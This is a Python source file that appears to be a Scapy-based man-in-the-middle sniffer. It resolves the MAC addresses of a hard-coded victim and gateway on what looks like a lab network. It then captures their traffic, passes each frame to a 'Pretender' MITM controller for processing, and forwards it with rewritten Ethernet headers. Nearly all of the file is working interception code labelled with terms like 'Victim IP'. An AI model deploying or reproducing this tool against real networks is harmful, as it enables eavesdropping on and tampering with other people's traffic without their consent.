from pretender import *

# Get MAC address from IP
def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, inter = 0.1)
	for snd, rcv in ans:
		return rcv.sprintf(r"%Ether.src%")
	#endfor
#def

# Send packet; fragment if necessary
def send_pkt (packet):
	if len(packet) > 1500:
		frags = fragment(packet,fragsize=500)
		for frag in frags:
			s.send(frag)
		#endfor
	else:
		s.send(packet)
	#endif
#enddef

# Capture packet
def capture (packet):
	# Process packet
	MITM.process(packet)
	# Forward packet
	myMAC = packet[Ether].dst
	packet[Ether].dst = EX.get(packet[Ether].src)
	packet[Ether].src = myMAC
	send_pkt(packet)
#enddef

if __name__ == '__main__':
	# try:
	# 	interface = raw_input("[*] Enter Desired Interface: ")
	# 	victimIP = raw_input("[*] Enter Victim IP: ")
	# 	gateIP = raw_input("[*] Enter Router IP: ")
	# except KeyboardInterrupt:
	# 	print "\n[*] User Requested Shutdown"
	# 	print "[*] Exiting..."
	# 	sys.exit(1)
	# #endtry
	interface = "eth0"
	victimIP = "10.0.2.4"
	gateIP = "10.0.2.2"
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		print "[!] Sniffer: Couldn't Find Victim MAC Address"
		print "[!] Sniffer: Exiting..."
		sys.exit(1)
	#endtry

	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		print "[!] Sniffer: Couldn't Find Gateway MAC Address"
		print "[!] Sniffer: Exiting..."
		sys.exit(1)
	#endtry

	# hash for forwarding
	EX = {gateMAC: victimMAC, victimMAC: gateMAC}
	# man-in-the-middle controller
	MITM = Pretender(victimMAC, gateMAC)
	# L2 socket
	s = conf.L2socket(iface=interface)

	print "\n[*] Begin sniffing...\n"
	sniff(filter="ether src %s or ether src %s" % (victimMAC, gateMAC), prn=capture)